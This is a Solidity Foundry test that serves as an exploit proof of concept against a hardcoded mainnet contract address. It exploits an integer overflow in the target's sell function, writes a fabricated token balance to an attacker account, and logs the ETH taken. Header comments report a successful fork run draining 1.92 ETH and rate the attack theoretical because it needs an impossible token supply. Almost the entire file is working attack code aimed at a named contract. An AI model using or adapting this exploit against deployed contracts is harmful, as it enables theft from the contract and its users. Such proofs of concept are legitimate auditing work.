// Validated live on a mainnet fork (2026): [PASS] attacker +1.92 ETH, target -1.92 ETH.
// amount = 2^240+192 (exact overflowing wrap of amount*sellPrice to the 1.92 ETH balance).
// Verdict: LOGIC-CONFIRMED (ECONOMICALLY CONDITIONAL / THEORETICAL) - needs 2^240 tokens vs 1000 supply.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console2, stdStorage, StdStorage} from "forge-std/Test.sol";
contract OverflowExploit is Test {
    using stdStorage for StdStorage;
    address constant TARGET = address(uint160(0x00cffafced915d6cc3e9b05ef38b52f0bccd897e91));
    function test_overflow() public {
        address attacker = makeAddr("attacker");
        uint256 amount = 1766847064778384329583297500742918515827483896875618958121606201292619968;          // exact smallest overflowing input: amount*multiplier wraps to the ETH balance
        console2.log("OVF_AMOUNT", amount);
        console2.log("OVF_SUPPLY", uint256(1000));
        // TARGETED injection: give the attacker the exact token balance the math needs; checked_write
        // reverts if the balanceOf slot can't be resolved, so we never fabricate against the wrong slot.
        try this._inject(attacker, amount) {} catch { console2.log("OVF_INJECT_FAIL", uint256(1)); return; }
        uint256 ethBefore = TARGET.balance;
        uint256 attBefore = attacker.balance;
        vm.prank(attacker, attacker);
        (bool ok, ) = TARGET.call(abi.encodeWithSignature("sell(uint256)", amount));
        console2.log("OVF_CALL_OK", ok);
        console2.log("OVF_ATT_ETH_GAIN", int256(attacker.balance) - int256(attBefore));
        console2.log("OVF_TGT_ETH_DELTA", int256(TARGET.balance) - int256(ethBefore));
    }
    function _inject(address who, uint256 amt) external {
        stdstore.target(TARGET).sig("balanceOf(address)").with_key(who).checked_write(amt);
    }
}
